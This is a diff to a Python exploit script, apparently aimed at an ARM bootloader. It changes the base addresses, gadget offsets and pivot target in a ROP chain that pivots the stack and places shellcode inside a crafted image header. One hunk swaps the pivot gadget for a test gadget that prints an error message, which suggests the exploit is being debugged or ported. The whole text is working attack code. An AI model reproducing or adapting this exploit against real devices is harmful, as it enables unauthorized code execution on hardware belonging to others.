@@ -2,8 +2,8 @@
 import sys
 import struct
 
-base = 0x4BD00000
-forced_addr = 0x45000000
+base = 0x41E00000
+forced_addr = 0x40080000
 
 # 5f53e:       bd0b            pop     {r0, r1, r3, pc}
 pop_r0_r1_r3_pc = base + 0x5f53e|1
@@ -16,7 +16,8 @@ blx_r3_pop_r3 = base + 0x1ac|1
 
 cache_func = base + 0x2A6DC
 
-test = base + 0x1C3 # prints "Error, the pointer of pidme_data is NULL."
+#test = base + 0x1C3 # prints "Error, the pointer of pidme_data is NULL."
+test = base + 0x3D160 # prints "Error, the pointer of pidme_data is NULL."
 
 shellcode_sz = 0x1000 # TODO: check size
 
@@ -31,7 +32,7 @@ shellcode_addr = forced_addr + inject_offset + 0x100
 # 42120:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
 pivot = base + 0x42120;
 
-ptr_offset = 0x3DC
+ptr_offset = 0x75CE8;
 
 r3_pc = base + (ptr_offset - 0x18) 
 ptr_pc = base + (ptr_offset - 0x08)
@@ -67,7 +68,7 @@ def main():
     hdr += b"\x00" * 0xA
     hdr += b"\x00" * (page_size - 0x40)
     hdr += b"\x00" * inject_offset
-    hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
+    hdr += struct.pack("<II", inject_addr + 0x40, test) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
     hdr += b"\x00" * 0x1C
     hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc
 
@@ -104,7 +105,7 @@ def main():
     hdr += b"\x00" * (lk_offset + page_size - len(hdr) - 0x200)
 
     hdr += orig
-    hdr += struct.pack("<ii", lk_r3_target - r3_pc, lk_ptr_target - ptr_pc)
+    hdr += struct.pack("<ii", lk_r3_target, lk_ptr_target)
     hdr += orig2
 
     payload_block = (inject_offset // 0x200)
